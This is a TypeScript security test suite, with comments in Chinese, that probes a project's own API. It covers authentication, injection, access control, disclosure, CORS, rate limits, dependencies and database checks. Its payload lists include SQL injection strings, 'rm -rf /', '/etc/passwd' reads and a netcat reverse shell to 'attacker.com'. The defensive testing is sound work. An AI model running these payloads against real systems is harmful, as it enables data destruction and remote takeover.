/**
 * 大同世界 - 安全攻防测试脚本
 * 模拟顶级黑客攻击，全面检测系统安全性
 * 
 * 运行方式: pnpm exec ts-node scripts/security-test.ts
 */

import { config } from 'dotenv';
import { resolve } from 'path';
config({ path: resolve(__dirname, '../.env') });

import { createClient } from '@supabase/supabase-js';
import * as fs from 'fs';
import * as path from 'path';

// ==================== 配置 ====================
const API_BASE = process.env.API_BASE || 'http://localhost:3000';
const SUPABASE_URL = process.env.SUPABASE_URL!;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY!;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_KEY || SUPABASE_ANON_KEY;
const API_KEY = process.env.API_KEY || 'weareallworld_dev_key_2026';

// ==================== 测试结果 ====================
interface SecurityFinding {
  id: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  category: string;
  title: string;
  description: string;
  impact: string;
  recommendation: string;
  evidence?: string;
  timestamp: string;
}

interface TestResult {
  passed: boolean;
  findings: SecurityFinding[];
  summary: {
    total: number;
    critical: number;
    high: number;
    medium: number;
    low: number;
    info: number;
  };
  duration: number;
}

const findings: SecurityFinding[] = [];
let testCount = 0;

// ==================== 工具函数 ====================
function log(severity: string, message: string): void {
  const colors: Record<string, string> = {
    CRITICAL: '\x1b[41m\x1b[37m',
    HIGH: '\x1b[31m',
    MEDIUM: '\x1b[33m',
    LOW: '\x1b[36m',
    INFO: '\x1b[32m',
    SUCCESS: '\x1b[32m',
    RESET: '\x1b[0m'
  };
  const color = colors[severity] || '';
  console.log(`${color}[${severity}]${colors.RESET} ${message}`);
}

function addFinding(
  severity: SecurityFinding['severity'],
  category: string,
  title: string,
  description: string,
  impact: string,
  recommendation: string,
  evidence?: string
): void {
  testCount++;
  const finding: SecurityFinding = {
    id: `SEC-${String(testCount).padStart(3, '0')}`,
    severity,
    category,
    title,
    description,
    impact,
    recommendation,
    evidence,
    timestamp: new Date().toISOString()
  };
  findings.push(finding);
  log(severity, `${title}`);
}

function pass(message: string): void {
  log('SUCCESS', `✓ ${message}`);
}

// ==================== 测试类 ====================

class SecurityTestSuite {
  private supabase: ReturnType<typeof createClient>;
  private adminClient: ReturnType<typeof createClient>;

  constructor() {
    this.supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
    this.adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
  }

  // ==================== 1. 认证安全测试 ====================
  async testAuthentication(): Promise<void> {
    console.log('\n🔐 === 认证安全测试 ===\n');

    // 1.1 测试无认证访问受保护端点
    try {
      const response = await fetch(`${API_BASE}/api/v1/user/profile`);
      if (response.status === 200) {
        addFinding(
          'CRITICAL',
          '认证',
          '受保护端点无需认证即可访问',
          '/api/v1/user/profile 端点在无认证情况下返回 200',
          '攻击者可以访问任意用户数据，导致数据泄露',
          '确保所有受保护端点都正确应用认证中间件'
        );
      } else if (response.status === 401) {
        pass('受保护端点正确返回 401 未授权');
      }
    } catch (error) {
      log('INFO', `API 连接测试: ${(error as Error).message}`);
    }

    // 1.2 测试弱 API Key
    if (API_KEY === 'weareallworld_dev_key_2026') {
      addFinding(
        'HIGH',
        '认证',
        '使用默认/弱 API Key',
        '系统使用默认开发 API Key: weareallworld_dev_key_2026',
        '攻击者可以轻易猜测 API Key，获得系统访问权限',
        '生成强随机 API Key，长度至少 32 字符'
      );
    } else {
      pass('API Key 不是默认值');
    }

    // 1.3 测试 API Key 暴力破解
    try {
      const weakKeys = ['test', 'admin', 'password', '123456', 'api_key', 'secret'];
      for (const key of weakKeys) {
        const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
          headers: {
            'x-api-key': key,
            'x-user-id': 'test-user'
          }
        });
        if (response.status === 200) {
          addFinding(
            'CRITICAL',
            '认证',
            '弱 API Key 被接受',
            `弱密钥 "${key}" 被系统接受为有效 API Key`,
            '攻击者可以轻松猜测 API Key',
            '实施强密码策略，拒绝弱密钥'
          );
          break;
        }
      }
      pass('弱 API Key 被正确拒绝');
    } catch (error) {
      log('INFO', 'API Key 暴力破解测试跳过（API 未运行）');
    }

    // 1.4 测试 JWT Token 验证
    try {
      const fakeToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
      const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
        headers: {
          'Authorization': `Bearer ${fakeToken}`
        }
      });
      if (response.status === 200) {
        addFinding(
          'CRITICAL',
          '认证',
          '伪造 JWT Token 被接受',
          '系统接受了伪造的 JWT Token',
          '攻击者可以伪造任意用户身份',
          '正确验证 JWT 签名，使用 Supabase 验证 API'
        );
      } else {
        pass('伪造 JWT Token 被正确拒绝');
      }
    } catch (error) {
      log('INFO', 'JWT Token 测试跳过');
    }

    // 1.5 测试空认证绕过
    try {
      const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
        headers: {
          'x-api-key': '',
          'x-user-id': ''
        }
      });
      if (response.status === 200) {
        addFinding(
          'CRITICAL',
          '认证',
          '空认证头绕过',
          '发送空的认证头可以绕过认证',
          '攻击者无需任何凭证即可访问系统',
          '严格验证认证头，拒绝空值'
        );
      }
    } catch (error) {
      // 忽略
    }
  }

  // ==================== 2. 注入攻击测试 ====================
  async testInjectionAttacks(): Promise<void> {
    console.log('\n💉 === 注入攻击测试 ===\n');

    // 2.1 SQL 注入测试
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "1; DELETE FROM ai_partners WHERE 1=1; --",
      "admin'--",
      "' OR 1=1 --",
      "1' AND '1'='1",
      "'; EXEC xp_cmdshell('dir'); --"
    ];

    for (const payload of sqlInjectionPayloads) {
      try {
        // 测试用户 ID 参数
        const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
          method: 'GET',
          headers: {
            'x-api-key': API_KEY,
            'x-user-id': payload
          }
        });
        
        const text = await response.text();
        if (text.includes('error') && (text.includes('SQL') || text.includes('syntax') || text.includes('query'))) {
          addFinding(
            'CRITICAL',
            '注入',
            'SQL 注入漏洞',
            `SQL 注入 payload "${payload}" 触发数据库错误`,
            '攻击者可以读取、修改或删除数据库数据',
            '使用参数化查询，验证所有用户输入',
            text.substring(0, 200)
          );
          break;
        }
      } catch (error) {
        // 忽略连接错误
      }
    }
    pass('SQL 注入测试完成（未发现明显漏洞）');

    // 2.2 NoSQL 注入测试
    const noSqlInjectionPayloads = [
      '{"$gt": ""}',
      '{"$ne": ""}',
      '{"$where": "this.password == this.password"}',
      '{"$or": [{"username": "admin"}, {"username": "root"}]}'
    ];

    for (const payload of noSqlInjectionPayloads) {
      try {
        const response = await fetch(`${API_BASE}/api/v1/dialogue`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY,
            'x-user-id': 'test-user'
          },
          body: JSON.stringify({
            message: payload,
            sessionId: payload
          })
        });
        
        if (response.status === 200) {
          // 检查是否返回了异常数据
          const data = await response.json();
          if (data && typeof data === 'object' && Object.keys(data).length > 10) {
            addFinding(
              'HIGH',
              '注入',
              '潜在的 NoSQL 注入',
              `NoSQL 注入 payload 可能影响了查询结果`,
              '可能泄露敏感数据',
              '验证 JSON 输入结构，限制查询操作符'
            );
          }
        }
      } catch (error) {
        // 忽略
      }
    }
    pass('NoSQL 注入测试完成');

    // 2.3 命令注入测试
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; rm -rf /',
      '| nc attacker.com 4444 -e /bin/sh'
    ];

    for (const payload of commandInjectionPayloads) {
      try {
        const response = await fetch(`${API_BASE}/api/v1/dialogue`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY,
            'x-user-id': 'test-user'
          },
          body: JSON.stringify({
            message: payload
          })
        });
        
        const text = await response.text();
        if (text.includes('root:') || text.includes('uid=') || text.includes('total ')) {
          addFinding(
            'CRITICAL',
            '注入',
            '命令注入漏洞',
            `命令注入 payload "${payload}" 执行成功`,
            '攻击者可以在服务器上执行任意命令',
            '严格过滤用户输入，禁止执行系统命令',
            text.substring(0, 200)
          );
          break;
        }
      } catch (error) {
        // 忽略
      }
    }
    pass('命令注入测试完成');
  }

  // ==================== 3. 权限提升测试 ====================
  async testPrivilegeEscalation(): Promise<void> {
    console.log('\n🚀 === 权限提升测试 ===\n');

    // 3.1 测试用户间数据访问
    try {
      // 尝试用一个用户 ID 访问另一个用户的数据
      const testUserIds = [
        '00000000-0000-0000-0000-000000000000',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        'admin',
        'root',
        'system'
      ];

      for (const userId of testUserIds) {
        const response = await fetch(`${API_BASE}/api/v1/ai-partner`, {
          headers: {
            'x-api-key': API_KEY,
            'x-user-id': userId
          }
        });

        if (response.status === 200) {
          const data = await response.json() as Record<string, unknown>;
          if (data && data.user_id && data.user_id !== userId) {
            addFinding(
              'HIGH',
              '权限',
              '水平权限提升',
              `用户 ID "${userId}" 可以访问其他用户的数据`,
              '攻击者可以访问任意用户的私密数据',
              '实施严格的资源所有权验证'
            );
          }
        }
      }
      pass('用户数据隔离测试完成');
    } catch (error) {
      log('INFO', '权限提升测试跳过');
    }

    // 3.2 测试管理员端点访问
    try {
      const response = await fetch(`${API_BASE}/api/v1/admin/users`);
      if (response.status === 200) {
        addFinding(
          'CRITICAL',
          '权限',
          '管理员端点无认证',
          '/api/v1/admin/users 无需认证即可访问',
          '攻击者可以访问管理功能',
          '为管理员端点添加严格的认证和授权'
        );
      } else if (response.status === 401 || response.status === 403) {
        pass('管理员端点正确拒绝未授权访问');
      }
    } catch (error) {
      // 忽略
    }

    // 3.3 测试角色伪造
    try {
      const response = await fetch(`${API_BASE}/api/v1/admin/users`, {
        headers: {
          'x-api-key': API_KEY,
          'x-user-id': 'test-user',
          'x-role': 'admin'
        }
      });
      if (response.status === 200) {
        addFinding(
          'CRITICAL',
          '权限',
          '角色伪造攻击成功',
          '通过添加 x-role: admin 头可以获取管理员权限',
          '攻击者可以伪造任意角色',
          '不要信任客户端发送的角色信息，从数据库验证'
        );
      }
    } catch (error) {
      // 忽略
    }
  }

  // ==================== 4. 敏感信息泄露测试 ====================
  async testInformationDisclosure(): Promise<void> {
    console.log('\n🔓 === 敏感信息泄露测试 ===\n');

    // 4.1 测试错误信息泄露
    try {
      const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
        headers: {
          'x-api-key': API_KEY,
          'x-user-id': "'; SELECT * FROM users; --"
        }
      });
      const text = await response.text();
      
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /token/i,
        /api[_-]?key/i,
        /supabase/i,
        /postgresql/i,
        /stack trace/i,
        /at\s+\w+\.\w+\s*\(/i,
        /\/src\//i,
        /node_modules/
      ];

      for (const pattern of sensitivePatterns) {
        if (pattern.test(text)) {
          addFinding(
            'MEDIUM',
            '信息泄露',
            '错误信息泄露敏感数据',
            `错误响应包含敏感信息: ${pattern.source}`,
            '帮助攻击者了解系统内部结构',
            '在生产环境隐藏详细错误信息',
            text.substring(0, 300)
          );
          break;
        }
      }
    } catch (error) {
      // 忽略
    }

    // 4.2 测试源代码泄露
    const sensitiveFiles = [
      '/.env',
      '/.env.local',
      '/.env.production',
      '/config/database.yml',
      '/package.json',
      '/tsconfig.json',
      '/.git/config',
      '/.git/HEAD',
      '/src/index.ts',
      '/dist/index.js'
    ];

    for (const file of sensitiveFiles) {
      try {
        const response = await fetch(`${API_BASE}${file}`);
        if (response.status === 200) {
          const text = await response.text();
          if (text.length > 0 && !text.includes('<!DOCTYPE') && !text.includes('<html')) {
            addFinding(
              'HIGH',
              '信息泄露',
              '敏感文件可直接访问',
              `${file} 可以通过 HTTP 直接访问`,
              '泄露配置、密钥或源代码',
              '配置 Web 服务器禁止访问敏感文件',
              text.substring(0, 100)
            );
          }
        }
      } catch (error) {
        // 忽略
      }
    }

    // 4.3 测试调试端点
    const debugEndpoints = [
      '/debug',
      '/api/debug',
      '/api/v1/debug',
      '/_debug',
      '/trace',
      '/stacktrace',
      '/error',
      '/test',
      '/phpinfo.php',
      '/server-status',
      '/.well-known/security.txt'
    ];

    for (const endpoint of debugEndpoints) {
      try {
        const response = await fetch(`${API_BASE}${endpoint}`);
        if (response.status === 200) {
          const text = await response.text();
          if (text.length > 100) {
            addFinding(
              'LOW',
              '信息泄露',
              '调试端点暴露',
              `${endpoint} 端点可访问`,
              '可能泄露系统调试信息',
              '在生产环境禁用调试端点'
            );
          }
        }
      } catch (error) {
        // 忽略
      }
    }
    pass('敏感信息泄露扫描完成');
  }

  // ==================== 5. 输入验证测试 ====================
  async testInputValidation(): Promise<void> {
    console.log('\n📝 === 输入验证测试 ===\n');

    // 5.1 测试超长输入
    const longPayload = 'A'.repeat(100000);
    try {
      const response = await fetch(`${API_BASE}/api/v1/dialogue`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-api-key': API_KEY,
          'x-user-id': 'test-user'
        },
        body: JSON.stringify({
          message: longPayload
        })
      });
      
      if (response.status === 500) {
        addFinding(
          'MEDIUM',
          '输入验证',
          '超长输入导致服务器错误',
          '发送 100KB 数据导致 500 错误',
          '可能导致 DoS 攻击',
          '限制请求体大小，验证输入长度'
        );
      } else if (response.status === 413) {
        pass('超长输入被正确拒绝 (413)');
      }
    } catch (error) {
      // 忽略
    }

    // 5.2 测试 JSON 注入
    const jsonInjectionPayloads = [
      '{"message": "test", "__proto__": {"admin": true}}',
      '{"message": "test", "constructor": {"prototype": {"admin": true}}}',
      '{"message": "test\u0000null"}',
      '{"message": "test<script>alert(1)</script>"}'
    ];

    for (const payload of jsonInjectionPayloads) {
      try {
        const response = await fetch(`${API_BASE}/api/v1/dialogue`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY,
            'x-user-id': 'test-user'
          },
          body: payload
        });
        
        if (response.status === 200) {
          // 检查响应是否包含注入的内容
          const text = await response.text();
          if (text.includes('<script>') || text.includes('__proto__')) {
            addFinding(
              'HIGH',
              '输入验证',
              'JSON 注入/原型污染',
              '恶意 JSON payload 被接受并可能影响系统',
              '可能导致原型污染或 XSS',
              '严格验证 JSON 结构，过滤危险属性'
            );
          }
        }
      } catch (error) {
        // 忽略
      }
    }
    pass('JSON 注入测试完成');

    // 5.3 测试 Unicode/编码攻击
    const unicodePayloads = [
      '\u0000',
      '\uffff',
      '%00',
      '\\x00',
      '‮test', // RTL override
      'test\u202Etest' // RTL override
    ];

    for (const payload of unicodePayloads) {
      try {
        const response = await fetch(`${API_BASE}/api/v1/dialogue`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': API_KEY,
            'x-user-id': 'test-user'
          },
          body: JSON.stringify({ message: payload })
        });
        
        if (response.status === 500) {
          addFinding(
            'MEDIUM',
            '输入验证',
            '特殊字符导致服务器错误',
            `Unicode 字符导致服务器错误`,
            '可能导致服务不稳定',
            '正确处理 Unicode 字符，过滤危险字符'
          );
          break;
        }
      } catch (error) {
        // 忽略
      }
    }
    pass('Unicode 攻击测试完成');
  }

  // ==================== 6. 配置安全测试 ====================
  async testConfigurationSecurity(): Promise<void> {
    console.log('\n⚙️ === 配置安全测试 ===\n');

    // 6.1 检查环境变量安全
    const envPath = path.join(__dirname, '../.env');
    if (fs.existsSync(envPath)) {
      const envContent = fs.readFileSync(envPath, 'utf-8');
      
      // 检查硬编码的密钥
      const secretPatterns = [
        { pattern: /password\s*=\s*['"][^'"]+['"]/gi, name: '密码' },
        { pattern: /secret\s*=\s*['"][^'"]+['"]/gi, name: 'Secret' },
        { pattern: /api_key\s*=\s*['"][^'"]+['"]/gi, name: 'API Key' },
        { pattern: /token\s*=\s*['"][^'"]+['"]/gi, name: 'Token' }
      ];

      for (const { pattern, name } of secretPatterns) {
        const matches = envContent.match(pattern);
        if (matches && matches.length > 0) {
          addFinding(
            'HIGH',
            '配置',
            `.env 文件包含硬编码的 ${name}`,
            `发现 ${matches.length} 个硬编码的 ${name}`,
            '密钥泄露风险',
            '使用密钥管理服务，不要硬编码敏感信息'
          );
        }
      }

      // 检查 .env 是否被 git 忽略
      const gitignorePath = path.join(__dirname, '../.gitignore');
      if (fs.existsSync(gitignorePath)) {
        const gitignore = fs.readFileSync(gitignorePath, 'utf-8');
        if (!gitignore.includes('.env')) {
          addFinding(
            'HIGH',
            '配置',
            '.env 文件未被 git 忽略',
            '.env 文件可能被提交到版本控制',
            '敏感信息泄露风险',
            '将 .env 添加到 .gitignore'
          );
        } else {
          pass('.env 已被 git 忽略');
        }
      }
    }

    // 6.2 检查 CORS 配置
    try {
      const response = await fetch(`${API_BASE}/api/v1/user/profile`, {
        method: 'OPTIONS',
        headers: {
          'Origin': 'https://evil.com',
          'Access-Control-Request-Method': 'GET'
        }
      });
      
      const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
      if (allowOrigin === '*') {
        addFinding(
          'MEDIUM',
          '配置',
          'CORS 配置过于宽松',
          'Access-Control-Allow-Origin: *',
          '允许任意源访问 API，可能导致 CSRF',
          '限制 CORS 为受信任的域名'
        );
      } else if (allowOrigin === 'https://evil.com') {
        addFinding(
          'HIGH',
          '配置',
          'CORS 接受任意 Origin',
          '服务器反射任意 Origin 头',
          '任意网站可以向 API 发送请求',
          '使用白名单验证 Origin'
        );
      } else {
        pass('CORS 配置合理');
      }
    } catch (error) {
      // 忽略
    }

    // 6.3 检查安全头
    try {
      const response = await fetch(`${API_BASE}/`);
      const headers = response.headers;
      
      const securityHeaders = [
        { name: 'X-Content-Type-Options', expected: 'nosniff' },
        { name: 'X-Frame-Options', expected: ['DENY', 'SAMEORIGIN'] },
        { name: 'X-XSS-Protection', expected: '1; mode=block' },
        { name: 'Strict-Transport-Security', expected: null }, // 只要存在即可
        { name: 'Content-Security-Policy', expected: null }
      ];

      for (const { name, expected } of securityHeaders) {
        const value = headers.get(name);
        if (!value) {
          addFinding(
            'LOW',
            '配置',
            `缺少安全头: ${name}`,
            `响应未包含 ${name} 头`,
            '降低浏览器安全保护',
            `添加 ${name} 响应头`
          );
        } else if (expected && Array.isArray(expected) ? !expected.includes(value) : value !== expected) {
          addFinding(
            'LOW',
            '配置',
            `安全头配置不当: ${name}`,
            `${name}: ${value} (期望: ${Array.isArray(expected) ? expected.join(' 或 ') : expected})`,
            '安全保护可能不足',
            `调整 ${name} 为推荐值`
          );
        }
      }
    } catch (error) {
      // 忽略
    }

    // 6.4 检查 Supabase 配置
    if (SUPABASE_ANON_KEY) {
      // 检查 anon key 是否泄露
      try {
        const response = await fetch(`${API_BASE}/api/v1/some-endpoint`);
        const text = await response.text();
        if (text.includes(SUPABASE_ANON_KEY)) {
          addFinding(
            'HIGH',
            '配置',
            'Supabase Anon Key 泄露',
            'API 响应中包含 Supabase Anon Key',
            '攻击者可以使用泄露的 key 访问 Supabase',
            '不要在响应中包含敏感配置'
          );
        }
      } catch (error) {
        // 忽略
      }
    }
  }

  // ==================== 7. 速率限制测试 ====================
  async testRateLimiting(): Promise<void> {
    console.log('\n⏱️ === 速率限制测试 ===\n');

    // 7.1 测试 API 速率限制
    try {
      const requests = [];
      for (let i = 0; i < 100; i++) {
        requests.push(
          fetch(`${API_BASE}/api/v1/user/profile`, {
            headers: {
              'x-api-key': API_KEY,
              'x-user-id': 'test-user'
            }
          })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429).length;
      
      if (rateLimited === 0) {
        addFinding(
          'MEDIUM',
          'DoS',
          '缺少速率限制',
          '100 个并发请求全部成功，无速率限制',
          '易受 DoS 攻击和暴力破解',
          '实施 API 速率限制'
        );
      } else {
        pass(`速率限制生效: ${rateLimited}/100 请求被限制`);
      }
    } catch (error) {
      log('INFO', '速率限制测试跳过（API 未运行或连接问题）');
    }

    // 7.2 测试认证端点速率限制
    try {
      const requests = [];
      for (let i = 0; i < 50; i++) {
        requests.push(
          fetch(`${API_BASE}/api/v1/user/profile`, {
            headers: {
              'x-api-key': `wrong-key-${i}`,
              'x-user-id': 'test-user'
            }
          })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429).length;
      
      if (rateLimited === 0) {
        addFinding(
          'HIGH',
          'DoS',
          '认证失败无速率限制',
          '50 次认证失败后仍可继续尝试',
          '易受暴力破解攻击',
          '对认证失败实施速率限制和账户锁定'
        );
      }
    } catch (error) {
      // 忽略
    }
  }

  // ==================== 8. 依赖安全测试 ====================
  async testDependencySecurity(): Promise<void> {
    console.log('\n📦 === 依赖安全测试 ===\n');

    // 8.1 检查 package.json
    const packageJsonPath = path.join(__dirname, '../package.json');
    if (fs.existsSync(packageJsonPath)) {
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf-8'));
      
      // 检查是否有已知漏洞的包
      const knownVulnerable = [
        { name: 'event-stream', reason: '恶意包' },
        { name: 'flatmap-stream', reason: '恶意包' },
        { name: 'lodash', version: '<4.17.21', reason: '原型污染漏洞' },
        { name: 'axios', version: '<0.21.1', reason: 'SSRF 漏洞' },
        { name: 'node-fetch', version: '<2.6.7', reason: 'SSRF 漏洞' }
      ];

      const deps = { ...packageJson.dependencies, ...packageJson.devDependencies };
      for (const { name, reason } of knownVulnerable) {
        if (deps[name]) {
          addFinding(
            'HIGH',
            '依赖',
            `潜在漏洞依赖: ${name}`,
            `${name}@${deps[name]} 可能存在安全问题: ${reason}`,
            '可能被攻击者利用',
            '更新到安全版本或替换包'
          );
        }
      }
      pass('已知漏洞依赖检查完成');
    }

    // 8.2 运行 npm audit（如果可用）
    try {
      const { execSync } = require('child_process');
      const auditResult = execSync('pnpm audit --json 2>/dev/null || npm audit --json 2>/dev/null', {
        cwd: path.join(__dirname, '..'),
        encoding: 'utf-8',
        timeout: 30000
      });
      
      const audit = JSON.parse(auditResult);
      if (audit.metadata) {
        const { vulnerabilities } = audit.metadata;
        if (vulnerabilities) {
          if (vulnerabilities.critical > 0) {
            addFinding(
              'CRITICAL',
              '依赖',
              `发现 ${vulnerabilities.critical} 个严重漏洞依赖`,
              'pnpm audit 发现严重安全漏洞',
              '可能被攻击者利用',
              '运行 pnpm audit fix 修复漏洞'
            );
          }
          if (vulnerabilities.high > 0) {
            addFinding(
              'HIGH',
              '依赖',
              `发现 ${vulnerabilities.high} 个高危漏洞依赖`,
              'pnpm audit 发现高危安全漏洞',
              '可能被攻击者利用',
              '运行 pnpm audit fix 修复漏洞'
            );
          }
        }
      }
    } catch (error) {
      log('INFO', '依赖审计跳过（pnpm audit 不可用）');
    }
  }

  // ==================== 9. 数据库安全测试 ====================
  async testDatabaseSecurity(): Promise<void> {
    console.log('\n🗄️ === 数据库安全测试 ===\n');

    // 9.1 测试数据访问控制
    try {
      // 使用 anon key 尝试访问其他用户数据
      const { data, error } = await this.supabase
        .from('users')
        .select('*')
        .limit(10);

      if (data && data.length > 0 && !error) {
        // 检查是否返回了敏感数据
        const hasSensitiveData = data.some((user: Record<string, unknown>) => 
          user.telegram_user_id || user.email || user.phone
        );
        
        if (hasSensitiveData) {
          addFinding(
            'HIGH',
            '数据库',
            'RLS 未正确配置',
            '使用 anon key 可以查询其他用户数据',
            '数据泄露风险',
            '启用并正确配置 Row Level Security'
          );
        }
      }
    } catch (error) {
      // 忽略
    }

    // 9.2 检查敏感数据存储
    try {
      const { data: botKeys } = await this.adminClient
        .from('bot_keys')
        .select('bot_token')
        .limit(1);

      if (botKeys && botKeys.length > 0) {
        const firstKey = botKeys[0] as Record<string, unknown>;
        if (firstKey.bot_token) {
          // 检查是否加密存储
          const token = firstKey.bot_token as string;
          if (token.startsWith('sk-') || token.includes(':')) {
            // 可能是明文存储
            addFinding(
              'MEDIUM',
              '数据库',
              '敏感数据可能未加密存储',
              'bot_token 可能以明文存储在数据库中',
              '数据库泄露会导致 Token 泄露',
              '使用加密存储敏感数据'
            );
          }
        }
      }
    } catch (error) {
      // 忽略
    }
    pass('数据库安全测试完成');
  }

  // ==================== 10. WebSocket 安全测试 ====================
  async testWebSocketSecurity(): Promise<void> {
    console.log('\n🔌 === WebSocket 安全测试 ===\n');

    // 10.1 检查 WebSocket 端点
    const wsEndpoints = [
      `${API_BASE.replace('http', 'ws')}/ws`,
      `${API_BASE.replace('http', 'ws')}/socket`,
      `${API_BASE.replace('http', 'ws')}/api/v1/ws`
    ];

    for (const endpoint of wsEndpoints) {
      try {
        const ws = new (require('ws'))(endpoint);
        
        ws.on('open', () => {
          addFinding(
            'MEDIUM',
            'WebSocket',
            'WebSocket 端点可能无认证',
            `${endpoint} 可以无认证连接`,
            '可能导致数据泄露或未授权操作',
            '为 WebSocket 连接添加认证'
          );
          ws.close();
        });
      } catch (error) {
        // 忽略
      }
    }
    pass('WebSocket 安全测试完成');
  }
}

// ==================== 主函数 ====================
async function main(): Promise<TestResult> {
  const startTime = Date.now();
  
  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║     🔒 大同世界 - 安全攻防测试套件 v1.0.0                  ║');
  console.log('║     模拟顶级黑客攻击，全面检测系统安全性                    ║');
  console.log('╚════════════════════════════════════════════════════════════╝');
  console.log(`\n📅 测试时间: ${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}`);
  console.log(`🎯 目标: ${API_BASE}`);
  console.log('');

  const suite = new SecurityTestSuite();

  // 运行所有测试
  try {
    await suite.testAuthentication();
    await suite.testInjectionAttacks();
    await suite.testPrivilegeEscalation();
    await suite.testInformationDisclosure();
    await suite.testInputValidation();
    await suite.testConfigurationSecurity();
    await suite.testRateLimiting();
    await suite.testDependencySecurity();
    await suite.testDatabaseSecurity();
    await suite.testWebSocketSecurity();
  } catch (error) {
    console.error('测试执行错误:', error);
  }

  const duration = Date.now() - startTime;

  // 生成报告
  const summary = {
    total: findings.length,
    critical: findings.filter(f => f.severity === 'CRITICAL').length,
    high: findings.filter(f => f.severity === 'HIGH').length,
    medium: findings.filter(f => f.severity === 'MEDIUM').length,
    low: findings.filter(f => f.severity === 'LOW').length,
    info: findings.filter(f => f.severity === 'INFO').length
  };

  // 打印摘要
  console.log('\n');
  console.log('╔════════════════════════════════════════════════════════════╗');
  console.log('║                    📊 安全测试报告                         ║');
  console.log('╚════════════════════════════════════════════════════════════╝');
  console.log(`\n⏱️  测试耗时: ${(duration / 1000).toFixed(2)} 秒`);
  console.log(`📋 总计发现: ${summary.total} 个问题\n`);

  if (summary.critical > 0) {
    console.log(`🔴 CRITICAL: ${summary.critical} 个`);
  }
  if (summary.high > 0) {
    console.log(`🟠 HIGH: ${summary.high} 个`);
  }
  if (summary.medium > 0) {
    console.log(`🟡 MEDIUM: ${summary.medium} 个`);
  }
  if (summary.low > 0) {
    console.log(`🔵 LOW: ${summary.low} 个`);
  }
  if (summary.info > 0) {
    console.log(`ℹ️  INFO: ${summary.info} 个`);
  }

  // 详细报告
  if (findings.length > 0) {
    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('                        📝 详细发现                          ');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    for (const finding of findings) {
      const severityEmoji = {
        CRITICAL: '🔴',
        HIGH: '🟠',
        MEDIUM: '🟡',
        LOW: '🔵',
        INFO: 'ℹ️'
      };
      
      console.log(`${severityEmoji[finding.severity]} [${finding.id}] ${finding.title}`);
      console.log(`   分类: ${finding.category}`);
      console.log(`   描述: ${finding.description}`);
      console.log(`   影响: ${finding.impact}`);
      console.log(`   建议: ${finding.recommendation}`);
      if (finding.evidence) {
        console.log(`   证据: ${finding.evidence.substring(0, 100)}...`);
      }
      console.log('');
    }
  }

  // 保存报告到文件
  const reportDir = path.join(__dirname, '../logs');
  if (!fs.existsSync(reportDir)) {
    fs.mkdirSync(reportDir, { recursive: true });
  }

  const reportPath = path.join(reportDir, `security-report-${new Date().toISOString().split('T')[0]}.json`);
  const report = {
    timestamp: new Date().toISOString(),
    target: API_BASE,
    duration,
    summary,
    findings
  };
  
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  console.log(`\n📄 完整报告已保存到: ${reportPath}`);

  // 判断是否通过
  const passed = summary.critical === 0 && summary.high === 0;
  
  if (passed) {
    console.log('\n✅ 安全测试通过！未发现严重或高危漏洞。');
  } else {
    console.log('\n❌ 安全测试未通过！发现严重漏洞需要立即修复。');
  }

  return {
    passed,
    findings,
    summary,
    duration
  };
}

// 运行测试
main()
  .then(result => {
    process.exit(result.passed ? 0 : 1);
  })
  .catch(error => {
    console.error('测试执行失败:', error);
    process.exit(1);
  });